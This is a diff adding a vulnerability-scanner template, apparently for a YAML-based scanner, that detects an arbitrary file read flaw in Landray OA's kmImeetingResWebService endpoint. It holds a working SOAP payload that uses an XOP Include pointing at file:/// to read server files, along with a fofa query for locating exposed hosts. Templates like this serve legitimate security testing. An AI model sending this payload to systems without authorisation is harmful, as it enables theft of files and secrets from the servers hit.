@@ -1,0 +1,45 @@
+id: landray-oa-kmImeetingResWebService-fileread
+info:
+  name: Landray OA kmImeetingResWebService File Read
+  author: ZacharyZcR
+  severity: high
+  verified: true
+  description: |-
+    Landray OA System kmImeetingResWebService interface has an arbitrary file read vulnerability.
+    The vulnerability exists in the getKmimeetingResById method which can be exploited to read arbitrary files on the system.
+    fofa: body="Com_Parameter"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8CEKP%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3sysFormMainDataInsystemWebservice%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: landray,fileread
+  created: 2024/12/30
+
+set:
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /sys/webservice/kmImeetingResWebService
+      headers:
+        Content-Type: multipart/related; boundary=----WebKitFormBoundary{{rboundary}}
+        SOAPAction: ""
+        Accept-Encoding: gzip, deflate
+      body: |
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.imeeting.km.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getKmimeetingResById>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///"/></count>
+                </arg0>
+            </web:getKmimeetingResById>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: response.status == 500 && response.body.bcontains(b'Unmarshalling Error')
+
+expression: r0()
